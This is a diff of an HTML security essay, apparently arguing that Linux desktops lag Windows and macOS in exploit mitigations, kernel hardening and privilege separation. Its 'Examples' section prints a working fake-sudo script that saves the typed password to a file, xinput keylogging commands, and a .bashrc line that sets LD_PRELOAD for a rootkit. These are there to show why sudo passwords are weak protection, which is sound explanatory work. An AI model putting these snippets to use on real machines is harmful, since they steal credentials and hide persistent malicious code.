+        <a href="https://manuals.info.apple.com/MANUALS/1000/MA1902/en_US/apple-platform-security-guide.pdf#page=56">Kernel Integrity Protection</a> (KIP) to protect the
+        kernel. More specifically, it uses a custom hardware mitigation known as <a href="https://siguza.github.io/KTRR/">KTRR</a> to enforce strict W^X permissions in
+        the kernel.
+      </li>
+    </ul>
 
-  <h3 id="cfi"><a href="#cfi">2.2 Control Flow Integrity</a></h3>
+    <h3 id="cfi"><a href="#cfi">2.2 Control Flow Integrity</a></h3>
 
-  <p>
-    As briefly mentioned before, code reuse attacks can be used to achieve near-arbitrary code execution by chaining together snippets of code that already
-    exist in the program. ACG and CIG only mitigate one potential attack vector — creating a ROP/JOP chain to transition mappings to executable. However, an
-    attacker can still use a pure ROP/JOP chain, relying wholly on the pre-existing gadgets without needing to introduce their own code. This can be mitigated
-    with <a href="https://blog.trailofbits.com/2016/10/17/lets-talk-about-cfi-clang-edition/">Control Flow Integrity</a> (CFI) which severely restricts the
-    gadgets an attacker is able to make use of, thus disrupting their chain. <br>
-    <br>
-    CFI usually has 2 parts: forward-edge protection (covering JOP, COP, etc.) and backward-edge protection (covering ROP). CFI implementations can vary significantly.
-    Some CFI implementations only cover either forward-edges or backward-edges. Some are coarse-grained (the attacker has more freeway to execute a larger amount
-    of instructions) rather than fine-grained. Some are probabilistic (they rely on a secret being held and the security properties are not guaranteed) rather than
-    deterministic. <br>
-    <br>
-    On Linux, CFI is practically nonexistent outside of Chromium, whereas Windows has its own coarse-grained, forward-edge CFI implementation, <a
-    href="https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard">Control Flow Guard</a> (CFG), in addition to making use of <a
-    href="https://techcommunity.microsoft.com/t5/windows-kernel-internals/understanding-hardware-enforced-stack-protection/ba-p/1247815">
-    Intel CET shadow stacks for backward-edge protection</a>. While CFG is only coarse-grained, <a href="https://connormcgarr.github.io/examining-xfg/">Microsoft are
-    working on making it more fine-grained with XFG</a>. <a href="https://manuals.info.apple.com/MANUALS/1000/MA1902/en_US/apple-platform-security-guide.pdf#page=56">M1
-    Macs also use Pointer Authentication Codes</a> (PAC) to ensure forward and backward-edge protection.
-  </p>
+    <p>
+      As briefly mentioned before, code reuse attacks can be used to achieve near-arbitrary code execution by chaining together snippets of code that already
+      exist in the program. ACG and CIG only mitigate one potential attack vector — creating a ROP/JOP chain to transition mappings to executable. However, an
+      attacker can still use a pure ROP/JOP chain, relying wholly on the pre-existing gadgets without needing to introduce their own code. This can be mitigated
+      with <a href="https://blog.trailofbits.com/2016/10/17/lets-talk-about-cfi-clang-edition/">Control Flow Integrity</a> (CFI) which severely restricts the
+      gadgets an attacker is able to make use of, thus disrupting their chain. <br>
+      <br>
+      CFI usually has 2 parts: forward-edge protection (covering JOP, COP, etc.) and backward-edge protection (covering ROP). CFI implementations can vary significantly.
+      Some CFI implementations only cover either forward-edges or backward-edges. Some are coarse-grained (the attacker has more freeway to execute a larger amount
+      of instructions) rather than fine-grained. Some are probabilistic (they rely on a secret being held and the security properties are not guaranteed) rather than
+      deterministic. <br>
+      <br>
+      On Linux, CFI is practically nonexistent outside of Chromium, whereas Windows has its own coarse-grained, forward-edge CFI implementation, <a
+      href="https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard">Control Flow Guard</a> (CFG), in addition to making use of <a
+      href="https://techcommunity.microsoft.com/t5/windows-kernel-internals/understanding-hardware-enforced-stack-protection/ba-p/1247815">
+      Intel CET shadow stacks for backward-edge protection</a>. While CFG is only coarse-grained, <a href="https://connormcgarr.github.io/examining-xfg/">Microsoft are
+      working on making it more fine-grained with XFG</a>. <a href="https://manuals.info.apple.com/MANUALS/1000/MA1902/en_US/apple-platform-security-guide.pdf#page=56">M1
+      Macs also use Pointer Authentication Codes</a> (PAC) to ensure forward and backward-edge protection.
+    </p>
 
-  <h3 id="auto-var-init"><a href="#auto-var-init">2.3 Automatic Variable Initialization</a></h3>
+    <h3 id="auto-var-init"><a href="#auto-var-init">2.3 Automatic Variable Initialization</a></h3>
 
-  <p>
-    One of the most common classes of memory corruption vulnerabilities is <a href="https://en.wikipedia.org/wiki/Uninitialized_variable">uninitialized memory</a>.
-    Windows <a href="https://msrc-blog.microsoft.com/2020/05/13/solving-uninitialized-stack-memory-on-windows/">uses InitAll</a> to automatically initialize stack variables
-    to zero for the kernel and some user space code, as well as <a href="https://msrc-blog.microsoft.com/2020/07/02/solving-uninitialized-kernel-pool-memory-on-windows/">
-    safer APIs for the kernel pool</a>, whereas on Linux, there are mitigations specifically for kernel stack and heap memory, but this does not cover
-    any user space code and most mainstream distributions don't actually enable them.
-  </p>
+    <p>
+      One of the most common classes of memory corruption vulnerabilities is <a href="https://en.wikipedia.org/wiki/Uninitialized_variable">uninitialized memory</a>.
+      Windows <a href="https://msrc-blog.microsoft.com/2020/05/13/solving-uninitialized-stack-memory-on-windows/">uses InitAll</a> to automatically initialize stack variables
+      to zero for the kernel and some user space code, as well as <a href="https://msrc-blog.microsoft.com/2020/07/02/solving-uninitialized-kernel-pool-memory-on-windows/">
+      safer APIs for the kernel pool</a>, whereas on Linux, there are mitigations specifically for kernel stack and heap memory, but this does not cover
+      any user space code and most mainstream distributions don't actually enable them.
+    </p>
 
-  <h3 id="vbs"><a href="#vbs">2.4 Virtualization-based Security</a></h3>
+    <h3 id="vbs"><a href="#vbs">2.4 Virtualization-based Security</a></h3>
 
-  <p>
-    Windows supports <a href="https://docs.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs">Virtualization-based Security</a> (VBS) which allows it
-    to run the entire operating system inside of a virtual machine and is used to enforce a number of security guarantees. Examples of such include:
-  </p>
+    <p>
+      Windows supports <a href="https://docs.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs">Virtualization-based Security</a> (VBS) which allows it
+      to run the entire operating system inside of a virtual machine and is used to enforce a number of security guarantees. Examples of such include:
+    </p>
 
-  <ul>
-    <li class="lilist">
-      <a href="https://techcommunity.microsoft.com/t5/windows-insider-program/virtualization-based-security-vbs-and-hypervisor-enforced-code/m-p/240571">Hypervisor-Enforced
-      Code Integrity</a> (HVCI) makes it significantly harder to inject malicious code into the kernel by using the hypervisor to strengthen code integrity guarantees and
-      ensuring that all code must be validly signed. Even if an attacker <a href="https://connormcgarr.github.io/pte-overwrites/">has arbitrary write capabilities and can
-      corrupt page table entries</a> (PTEs) to manipulate page permissions, they will still be unable to execute their shellcode because the hypervisor that runs at a higher
-      privilege level won't permit it. This can be thought of as similar to <a href="linux.html#acg-cig">ACG</a> but
-      much stronger and for the kernel.
-    </li>
+    <ul>
+      <li>
+        <a href="https://techcommunity.microsoft.com/t5/windows-insider-program/virtualization-based-security-vbs-and-hypervisor-enforced-code/m-p/240571">Hypervisor-Enforced
+        Code Integrity</a> (HVCI) makes it significantly harder to inject malicious code into the kernel by using the hypervisor to strengthen code integrity guarantees and
+        ensuring that all code must be validly signed. Even if an attacker <a href="https://connormcgarr.github.io/pte-overwrites/">has arbitrary write capabilities and can
+        corrupt page table entries</a> (PTEs) to manipulate page permissions, they will still be unable to execute their shellcode because the hypervisor that runs at a higher
+        privilege level won't permit it. This can be thought of as similar to <a href="linux.html#acg-cig">ACG</a> but
+        much stronger and for the kernel.
+      </li>
 
-    <li class="lilist">
-      <a href="https://www.microsoft.com/security/blog/2020/07/08/introducing-kernel-data-protection-a-new-platform-security-technology-for-preventing-data-corruption/">
-      Kernel Data Protection</a> (KDP) prevents tampering with kernel data structures by using the hypervisor to mark them as read-only, thereby making <a
-      href="https://www.blackhat.com/docs/asia-17/materials/asia-17-Sun-The-Power-Of-Data-Oriented-Attacks-Bypassing-Memory-Mitigation-Using-Data-Only-Exploitation-Technique.pdf">
-      data-only attacks</a> more difficult.
-    </li>
-  </ul>
+      <li>
+        <a href="https://www.microsoft.com/security/blog/2020/07/08/introducing-kernel-data-protection-a-new-platform-security-technology-for-preventing-data-corruption/">
+        Kernel Data Protection</a> (KDP) prevents tampering with kernel data structures by using the hypervisor to mark them as read-only, thereby making <a
+        href="https://www.blackhat.com/docs/asia-17/materials/asia-17-Sun-The-Power-Of-Data-Oriented-Attacks-Bypassing-Memory-Mitigation-Using-Data-Only-Exploitation-Technique.pdf">
+        data-only attacks</a> more difficult.
+      </li>
+    </ul>
 
-  <p>
-    On Linux, there is no equivalent.
-  </p>
+    <p>
+      On Linux, there is no equivalent.
+    </p>
 
-  <h2 id="kernel"><a href="#kernel">3. Kernel</a></h2>
+    <h2 id="kernel"><a href="#kernel">3. Kernel</a></h2>
 
-  <p>
-    The Linux kernel itself is also extremely lacking in security. It is a monolithic kernel which means that it contains a colossal amount of code all within the most privileged part of
-    the operating system and has no isolation between internal components whatsoever. The kernel has huge attack surface and is constantly adding new and dangerous features. It encompasses
-    hundreds of subsystems, tens of thousands of configuration options and millions of lines of code. The Linux kernel's size grows exponentially across each release and it can be thought
-    of as equivalent to running all user space code as root in PID 1, if not even more dangerous. <br>
-    <br>
-    One example of such dangerous features is <a href="https://lwn.net/Articles/740157/">eBPF</a>. In a nutshell, eBPF is a very powerful framework within the Linux kernel that allows
-    <em>unprivileged</em> user space to execute arbitrary code within the kernel in order to dynamically extend kernel functionality. eBPF also includes a JIT compiler which is fundamentally
-    a W^X violation and opens up the possibility of JIT spraying. <a href="https://github.com/torvalds/linux/blob/master/kernel/bpf/verifier.c">The kernel does perform a number of checks
-    on the code that is executed</a>, but these are routinely bypassed and <a href="https://seclists.org/oss-sec/2021/q2/171">this</a> <a
-    href="https://www.openwall.com/lists/oss-security/2021/04/08/1">feature</a> <a href="https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html">has</a> <a
-    href="https://twitter.com/spendergrsec/status/1244703091037024257">still</a> <a href="https://twitter.com/bleidl/status/943714277403357185">caused</a> <a
-    href="https://scannell.me/fuzzing-for-ebpf-jit-bugs-in-the-linux-kernel/">numerous</a> <a
-    href="https://www.thezdi.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification">security</a> <a
-    href="https://haxx.in/files/blasty-vs-ebpf.c">vulnerabilities</a>. <br>
-    <br>
-    Another example of these features is <a href="https://www.man7.org/linux/man-pages/man7/user_namespaces.7.html">user namespaces</a>. User namespaces allow unprivileged users to interact
-    with lots of kernel code that is normally reserved for the root user. It adds a massive amount of networking, mount, etc. functionality as new attack surface. It has also been the cause of <a
-    href="https://lists.archlinux.org/pipermail/arch-general/2017-February/043066.html">numerous</a> <a
-    href="https://lists.archlinux.org/pipermail/arch-general/2017-February/043078.html">privilege</a> <a
-    href="https://github.com/a13xp0p0v/kconfig-hardened-check#questions-and-answers">escalation</a>
-    <a href="https://github.com/subgraph/oz/issues/11#issuecomment-163396758">vulnerabilities</a> which is why many distributions, <a
-    href="https://salsa.debian.org/kernel-team/linux/-/blob/master/debian/patches/debian/add-sysctl-to-disallow-unprivileged-CLONE_NEWUSER-by-default.patch">
-    such as Debian</a>, had started to restrict access to this functionality by default. The endless stream of vulnerabilities
-    arising from this feature shows no sign of stopping either, even after years since its introduction. <br>
-    <br>
-    The kernel is written entirely in a memory unsafe language and has hundreds of bugs, many being security vulnerabilities, <a
-    href="https://events19.linuxfoundation.org/wp-content/uploads/2017/11/Syzbot-and-the-Tale-of-Thousand-Kernel-Bugs-Dmitry-Vyukov-Google.pdf">discovered
-    each <em>month</em></a>. In fact, there are so many bugs being found in the kernel, developers can’t keep up which
-    results in many of the bugs <a href="https://syzkaller.appspot.com/upstream">staying unfixed for a long time</a>.
-    <a href="https://jon.oberheide.org/files/syscan12-exploitinglinux.pdf">The kernel is decades behind in exploit
-    mitigations</a> and many kernel developers simply <a
-    href="https://www.washingtonpost.com/sf/business/2015/11/05/net-of-insecurity-the-kernel-of-the-argument/">do not
-    care enough</a>. <br>
-    <br>
-    Other kernels, such as the Windows and macOS kernels, are somewhat similar too, in that they are also large and bloated monolithic kernels with huge
-    attack surface, but they at least realise that these issues exist and take further steps to mitigate them. As an example of this, Windows has historically
-    been plagued by vulnerabilities within its font parsing code so in response, <a
-    href="https://www.microsoft.com/security/blog/2017/01/13/hardening-windows-10-with-zero-day-exploit-mitigations/">Microsoft moved all font parsing out of
-    the kernel and into a separate, heavily sandboxed user space process, restricted via AppContainer</a>. Windows also implemented a mitigation to <a
-    href="https://docs.microsoft.com/en-us/troubleshoot/windows-client/shell-experience/feature-to-block-untrusted-fonts">block untrusted fonts from specific processes
-    to reduce attack surface</a>. Similarly, <a href="https://devstreaming-cdn.apple.com/videos/wwdc/2017/707h2gkb95cx1l/707/707_advances_in_networking_part_1.pdf">
-    macOS moved a substantial portion of its networking stack — the transport layer — from the kernel into user space</a>, thereby significantly reducing remote kernel
-    attack surface and the impact of vulnerabilities in the networking stack. Linux, however, does not focus on such systemic approaches to security.
-  </p>
+    <p>
+      The Linux kernel itself is also extremely lacking in security. It is a monolithic kernel which means that it contains a colossal amount of code all within the most privileged part of
+      the operating system and has no isolation between internal components whatsoever. The kernel has huge attack surface and is constantly adding new and dangerous features. It encompasses
+      hundreds of subsystems, tens of thousands of configuration options and millions of lines of code. The Linux kernel's size grows exponentially across each release and it can be thought
+      of as equivalent to running all user space code as root in PID 1, if not even more dangerous. <br>
+      <br>
+      One example of such dangerous features is <a href="https://lwn.net/Articles/740157/">eBPF</a>. In a nutshell, eBPF is a very powerful framework within the Linux kernel that allows
+      <em>unprivileged</em> user space to execute arbitrary code within the kernel in order to dynamically extend kernel functionality. eBPF also includes a JIT compiler which is fundamentally
+      a W^X violation and opens up the possibility of JIT spraying. <a href="https://github.com/torvalds/linux/blob/master/kernel/bpf/verifier.c">The kernel does perform a number of checks
+      on the code that is executed</a>, but these are routinely bypassed and <a href="https://seclists.org/oss-sec/2021/q2/171">this</a> <a
+      href="https://www.openwall.com/lists/oss-security/2021/04/08/1">feature</a> <a href="https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html">has</a> <a
+      href="https://twitter.com/spendergrsec/status/1244703091037024257">still</a> <a href="https://twitter.com/bleidl/status/943714277403357185">caused</a> <a
+      href="https://scannell.me/fuzzing-for-ebpf-jit-bugs-in-the-linux-kernel/">numerous</a> <a
+      href="https://www.thezdi.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification">security</a> <a
+      href="https://haxx.in/files/blasty-vs-ebpf.c">vulnerabilities</a>. <br>
+      <br>
+      Another example of these features is <a href="https://www.man7.org/linux/man-pages/man7/user_namespaces.7.html">user namespaces</a>. User namespaces allow unprivileged users to interact
+      with lots of kernel code that is normally reserved for the root user. It adds a massive amount of networking, mount, etc. functionality as new attack surface. It has also been the cause of <a
+      href="https://lists.archlinux.org/pipermail/arch-general/2017-February/043066.html">numerous</a> <a
+      href="https://lists.archlinux.org/pipermail/arch-general/2017-February/043078.html">privilege</a> <a
+      href="https://github.com/a13xp0p0v/kconfig-hardened-check#questions-and-answers">escalation</a>
+      <a href="https://github.com/subgraph/oz/issues/11#issuecomment-163396758">vulnerabilities</a> which is why many distributions, <a
+      href="https://salsa.debian.org/kernel-team/linux/-/blob/master/debian/patches/debian/add-sysctl-to-disallow-unprivileged-CLONE_NEWUSER-by-default.patch">
+      such as Debian</a>, had started to restrict access to this functionality by default. The endless stream of vulnerabilities
+      arising from this feature shows no sign of stopping either, even after years since its introduction. <br>
+      <br>
+      The kernel is written entirely in a memory unsafe language and has hundreds of bugs, many being security vulnerabilities, <a
+      href="https://events19.linuxfoundation.org/wp-content/uploads/2017/11/Syzbot-and-the-Tale-of-Thousand-Kernel-Bugs-Dmitry-Vyukov-Google.pdf">discovered
+      each <em>month</em></a>. In fact, there are so many bugs being found in the kernel, developers can’t keep up which
+      results in many of the bugs <a href="https://syzkaller.appspot.com/upstream">staying unfixed for a long time</a>.
+      <a href="https://jon.oberheide.org/files/syscan12-exploitinglinux.pdf">The kernel is decades behind in exploit
+      mitigations</a> and many kernel developers simply <a
+      href="https://www.washingtonpost.com/sf/business/2015/11/05/net-of-insecurity-the-kernel-of-the-argument/">do not
+      care enough</a>. <br>
+      <br>
+      Other kernels, such as the Windows and macOS kernels, are somewhat similar too, in that they are also large and bloated monolithic kernels with huge
+      attack surface, but they at least realise that these issues exist and take further steps to mitigate them. As an example of this, Windows has historically
+      been plagued by vulnerabilities within its font parsing code so in response, <a
+      href="https://www.microsoft.com/security/blog/2017/01/13/hardening-windows-10-with-zero-day-exploit-mitigations/">Microsoft moved all font parsing out of
+      the kernel and into a separate, heavily sandboxed user space process, restricted via AppContainer</a>. Windows also implemented a mitigation to <a
+      href="https://docs.microsoft.com/en-us/troubleshoot/windows-client/shell-experience/feature-to-block-untrusted-fonts">block untrusted fonts from specific processes
+      to reduce attack surface</a>. Similarly, <a href="https://devstreaming-cdn.apple.com/videos/wwdc/2017/707h2gkb95cx1l/707/707_advances_in_networking_part_1.pdf">
+      macOS moved a substantial portion of its networking stack — the transport layer — from the kernel into user space</a>, thereby significantly reducing remote kernel
+      attack surface and the impact of vulnerabilities in the networking stack. Linux, however, does not focus on such systemic approaches to security.
+    </p>
 
-  <h2 id="root"><a href="#root">4. The Nonexistent Boundary of Root</a></h2>
+    <h2 id="root"><a href="#root">4. The Nonexistent Boundary of Root</a></h2>
 
-  <p>
-    On ordinary Linux desktops, <a href="https://www.whonix.org/wiki/Dev/Strong_Linux_User_Account_Isolation">a compromised non-root user account with access to
-    sudo is equal to full root compromise</a> as there are an abundance of ways for an attacker to retrieve the sudo password. Usually, the standard
-    user is part of the "sudo" or "wheel" group which makes a sudo password security theater. For example, the attacker can exploit the plethora of keylogging
-    opportunities, such as <a href="https://theinvisiblethings.blogspot.com/2011/04/linux-security-circus-on-gui-isolation.html">Xorg’s lack of GUI isolation</a>,
-    <a href="https://www.usenix.org/legacy/event/sec09/tech/full_papers/zhang.pdf">the</a> <a href="https://www.openwall.com/lists/oss-security/2011/11/05/3">many</a>
-    <a href="https://staff.ie.cuhk.edu.hk/~khzhang/my-papers/2016-oakland-interrupt.pdf">infoleaks</a> <a href="https://www.repository.cam.ac.uk/handle/1810/254306">in the</a>
-    <a href="https://www.cs.ucr.edu/~zhiyunq/pub/sec14_android_activity_inference.pdf">procfs</a> <a href="https://www.gruss.cc/files/procharvester.pdf">filesystem</a>,
-    <a href="https://github.com/Aishou/wayland-keylogger"> using <code>LD_PRELOAD</code> to hook into processes</a> and so much more. Even if one were to mitigate every
-    single way to log keystrokes, <a href="https://twitter.com/spendergrsec/status/1355681146273722372"> the attacker can simply setup their own fake sudo prompt</a>
-    by manipulating <code>$PATH</code> or shell aliases/functions to intercept the user's password, completely unbeknownst to the user. <br>
-    <br>
-    While similar attacks are still possible on other operating systems due to the inherent issues in escalating privileges from an untrusted account, they are often
-    much harder to pull off than on Linux. For example, Windows' <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-overview">
-    User Account Control</a> (UAC) provides the <a
-    href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation">
-    secure desktop functionality</a> which can make spoofing it significantly harder, provided one is using a standard user account. Moreover, Windows better prevents
-    keylogging by <a href="https://docs.microsoft.com/en-us/previous-versions/dotnet/articles/bb625963(v=msdn.10)#user-interface-privilege-isolation-uipi-and-integrity">
-    isolating processes that run at lower integrity levels from those that run at higher integrity levels</a>, therefore mitigating Xorg-style attacks. Windows also <a
-    href="https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-security">restricts DLL preloading</a> by <a
-    href="https://docs.microsoft.com/en-us/windows/win32/dlls/secure-boot-and-appinit-dlls">disabling the AppInit_DLLs functionality when secure boot is enabled</a> and
-    providing a way to <a href="https://docs.microsoft.com/en-gb/windows/win32/api/libloaderapi/nf-libloaderapi-setdefaultdlldirectories"> restrict DLL search paths</a>,
-    therefore also mitigating many <code>LD_PRELOAD</code>-style attacks. Similarly, macOS includes the <a
-    href="https://developer.apple.com/library/archive/technotes/tn2150/_index.html">secure event input</a> feature which thwarts many keylogging attempts and secures
-    keyboard input. In addition, macOS' <a href="https://support.apple.com/en-us/HT204899">System Integrity Protection</a> and <a
-    href="https://developer.apple.com/documentation/security/hardened_runtime">Hardened Runtime</a> features can also prevent <code>LD_PRELOAD</code>-style attacks.
-  </p>
+    <p>
+      On ordinary Linux desktops, <a href="https://www.whonix.org/wiki/Dev/Strong_Linux_User_Account_Isolation">a compromised non-root user account with access to
+      sudo is equal to full root compromise</a> as there are an abundance of ways for an attacker to retrieve the sudo password. Usually, the standard
+      user is part of the "sudo" or "wheel" group which makes a sudo password security theater. For example, the attacker can exploit the plethora of keylogging
+      opportunities, such as <a href="https://theinvisiblethings.blogspot.com/2011/04/linux-security-circus-on-gui-isolation.html">Xorg’s lack of GUI isolation</a>,
+      <a href="https://www.usenix.org/legacy/event/sec09/tech/full_papers/zhang.pdf">the</a> <a href="https://www.openwall.com/lists/oss-security/2011/11/05/3">many</a>
+      <a href="https://staff.ie.cuhk.edu.hk/~khzhang/my-papers/2016-oakland-interrupt.pdf">infoleaks</a> <a href="https://www.repository.cam.ac.uk/handle/1810/254306">in the</a>
+      <a href="https://www.cs.ucr.edu/~zhiyunq/pub/sec14_android_activity_inference.pdf">procfs</a> <a href="https://www.gruss.cc/files/procharvester.pdf">filesystem</a>,
+      <a href="https://github.com/Aishou/wayland-keylogger"> using <code>LD_PRELOAD</code> to hook into processes</a> and so much more. Even if one were to mitigate every
+      single way to log keystrokes, <a href="https://twitter.com/spendergrsec/status/1355681146273722372"> the attacker can simply setup their own fake sudo prompt</a>
+      by manipulating <code>$PATH</code> or shell aliases/functions to intercept the user's password, completely unbeknownst to the user. <br>
+      <br>
+      While similar attacks are still possible on other operating systems due to the inherent issues in escalating privileges from an untrusted account, they are often
+      much harder to pull off than on Linux. For example, Windows' <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-overview">
+      User Account Control</a> (UAC) provides the <a
+      href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation">
+      secure desktop functionality</a> which can make spoofing it significantly harder, provided one is using a standard user account. Moreover, Windows better prevents
+      keylogging by <a href="https://docs.microsoft.com/en-us/previous-versions/dotnet/articles/bb625963(v=msdn.10)#user-interface-privilege-isolation-uipi-and-integrity">
+      isolating processes that run at lower integrity levels from those that run at higher integrity levels</a>, therefore mitigating Xorg-style attacks. Windows also <a
+      href="https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-security">restricts DLL preloading</a> by <a
+      href="https://docs.microsoft.com/en-us/windows/win32/dlls/secure-boot-and-appinit-dlls">disabling the AppInit_DLLs functionality when secure boot is enabled</a> and
+      providing a way to <a href="https://docs.microsoft.com/en-gb/windows/win32/api/libloaderapi/nf-libloaderapi-setdefaultdlldirectories"> restrict DLL search paths</a>,
+      therefore also mitigating many <code>LD_PRELOAD</code>-style attacks. Similarly, macOS includes the <a
+      href="https://developer.apple.com/library/archive/technotes/tn2150/_index.html">secure event input</a> feature which thwarts many keylogging attempts and secures
+      keyboard input. In addition, macOS' <a href="https://support.apple.com/en-us/HT204899">System Integrity Protection</a> and <a
+      href="https://developer.apple.com/documentation/security/hardened_runtime">Hardened Runtime</a> features can also prevent <code>LD_PRELOAD</code>-style attacks.
+    </p>
 
-  <h2 id="examples"><a href="#examples">5. Examples</a></h2>
+    <h2 id="examples"><a href="#examples">5. Examples</a></h2>
 
-  <p>
-    The example below sets up a fake sudo prompt to intercept the sudo password:
-  </p>
+    <p>
+      The example below sets up a fake sudo prompt to intercept the sudo password:
+    </p>
 
-  <pre><code>cat &lt;&lt;\EOF > /tmp/sudo
-#!/bin/bash
-if [[ "${@}" = "" ]]; then
-  /usr/bin/sudo
-else
-  read -s -r -p "[sudo] password for ${USER}: " password
-  echo "${password}" > /tmp/password
-  echo "${password}" | /usr/bin/sudo -S ${@}
-fi
-EOF
-chmod +x /tmp/sudo
-export PATH="/tmp:${PATH}"</code></pre>
+    <pre><code>cat &lt;&lt;\EOF > /tmp/sudo
+  #!/bin/bash
+  if [[ "${@}" = "" ]]; then
+    /usr/bin/sudo
+  else
+    read -s -r -p "[sudo] password for ${USER}: " password
+    echo "${password}" > /tmp/password
+    echo "${password}" | /usr/bin/sudo -S ${@}
+  fi
+  EOF
+  chmod +x /tmp/sudo
+  export PATH="/tmp:${PATH}"</code></pre>
 
-  <p>
-    Executing the full path to the sudo executable will not help either as an attacker can fake that with a shell function:
-  </p>
+    <p>
+      Executing the full path to the sudo executable will not help either as an attacker can fake that with a shell function:
+    </p>
 
-  <pre><code>function /bin/sudo { ... }
-function /usr/bin/sudo { ... }</code></pre>
+    <pre><code>function /bin/sudo { ... }
+  function /usr/bin/sudo { ... }</code></pre>
 
-  <p>
-    Alternatively, an attacker could log keystrokes via X11:
-  </p>
+    <p>
+      Alternatively, an attacker could log keystrokes via X11:
+    </p>
 
-  <pre><code>xinput list # Find your keyboard ID.
-xinput test id # Replace "id" with the ID from the above command.</code></pre>
+    <pre><code>xinput list # Find your keyboard ID.
+  xinput test id # Replace "id" with the ID from the above command.</code></pre>
 
-  <p>
-    Now the attacker can use <code>modprobe</code> to escalate into kernel mode. <br>
-    <br>
-    An attacker could also trivially setup a persistent, session-wide rootkit via <code>LD_PRELOAD</code> or similar variables:
-  </p>
+    <p>
+      Now the attacker can use <code>modprobe</code> to escalate into kernel mode. <br>
+      <br>
+      An attacker could also trivially setup a persistent, session-wide rootkit via <code>LD_PRELOAD</code> or similar variables:
+    </p>
 
-  <pre><code>echo "export LD_PRELOAD=\"/path/to/malicious_library\"" >> ~/.bashrc</code></pre>
+    <pre><code>echo "export LD_PRELOAD=\"/path/to/malicious_library\"" >> ~/.bashrc</code></pre>
 
-  <p>
-    This technique is quite common and is used in the majority of user space rootkits. A few examples are <a
-    href="https://github.com/chokepoint/azazel">azazel</a>, <a href="https://github.com/chokepoint/Jynx2">Jynx2</a>
-    and <a href="https://www.intezer.com/blog/linux/hiddenwasp-malware-targeting-linux-systems/">HiddenWasp</a>. <br>
-    <br>
-    Those listed above are merely a few examples and do not even require exploiting bugs.
-  </p>
+    <p>
+      This technique is quite common and is used in the majority of user space rootkits. A few examples are <a
+      href="https://github.com/chokepoint/azazel">azazel</a>, <a href="https://github.com/chokepoint/Jynx2">Jynx2</a>
+      and <a href="https://www.intezer.com/blog/linux/hiddenwasp-malware-targeting-linux-systems/">HiddenWasp</a>. <br>
+      <br>
+      Those listed above are merely a few examples and do not even require exploiting bugs.
+    </p>
 
-  <h2 id="distro-specific-issues"><a href="#distro-specific-issues">6. Distribution-specific Issues</a></h2>
+    <h2 id="distro-specific-issues"><a href="#distro-specific-issues">6. Distribution-specific Issues</a></h2>
 
-  <h3 id="stable-release-models"><a href="#stable-release-models">6.1 Stable Release Models</a></h3>
+    <h3 id="stable-release-models"><a href="#stable-release-models">6.1 Stable Release Models</a></h3>
 
-  <p>
-    A myriad of common Linux distributions, including Debian, Ubuntu, RHEL/CentOS, among numerous others use what's known as
-    a "stable" software release model. This involves freezing packages for a very long time and only ever backporting security
-    fixes that have received a <a href="https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures">CVE</a>. However,
-    this approach misses the vast majority of security fixes. <a href="https://arxiv.org/abs/2105.14565">Most security fixes
-    do not receive CVEs</a> because either the developer simply doesn’t care or because it’s not obvious whether or not a bug
-    is exploitable at first. <br>
-    <br>
-    Distribution maintainers cannot analyse every single commit perfectly and backport every security fix so they have to rely
-    on CVEs which people do not use properly. For example, the Linux kernel <a
-    href="https://github.com/gregkh/presentation-cve-is-dead/blob/master/cve-linux-kernel.pdf">is</a> <a
-    href="https://grsecurity.net/reports_of_cves_death_greatly_exaggerated">particularly</a> <a
-    href="https://blog.frizn.fr/linux-kernel/cve-2020-14381">bad</a> <a href="https://seclists.org/oss-sec/2019/q2/165">at this</a>.    
-    Even when there is a CVE assigned to an issue, sometimes fixes still aren't backported, such as in the Debian Chromium package
-    which is <a href="https://forums.whonix.org/t/chromium-browser-for-kicksecure-discussions-not-whonix/10388/49">still affected
-    by many severe and public vulnerabilities, some of which are even being exploited in the wild</a>. <br>
-    <br>
-    This is in contrast to a rolling release model, in which users can update as soon as the software is released, thereby acquiring
-    all security fixes up to that point.
-  </p>
+    <p>
+      A myriad of common Linux distributions, including Debian, Ubuntu, RHEL/CentOS, among numerous others use what's known as
+      a "stable" software release model. This involves freezing packages for a very long time and only ever backporting security
+      fixes that have received a <a href="https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures">CVE</a>. However,
+      this approach misses the vast majority of security fixes. <a href="https://arxiv.org/abs/2105.14565">Most security fixes
+      do not receive CVEs</a> because either the developer simply doesn’t care or because it’s not obvious whether or not a bug
+      is exploitable at first. <br>
+      <br>
+      Distribution maintainers cannot analyse every single commit perfectly and backport every security fix so they have to rely
+      on CVEs which people do not use properly. For example, the Linux kernel <a
+      href="https://github.com/gregkh/presentation-cve-is-dead/blob/master/cve-linux-kernel.pdf">is</a> <a
+      href="https://grsecurity.net/reports_of_cves_death_greatly_exaggerated">particularly</a> <a
+      href="https://blog.frizn.fr/linux-kernel/cve-2020-14381">bad</a> <a href="https://seclists.org/oss-sec/2019/q2/165">at this</a>.    
+      Even when there is a CVE assigned to an issue, sometimes fixes still aren't backported, such as in the Debian Chromium package
+      which is <a href="https://forums.whonix.org/t/chromium-browser-for-kicksecure-discussions-not-whonix/10388/49">still affected
+      by many severe and public vulnerabilities, some of which are even being exploited in the wild</a>. <br>
+      <br>
+      This is in contrast to a rolling release model, in which users can update as soon as the software is released, thereby acquiring
+      all security fixes up to that point.
+    </p>
 
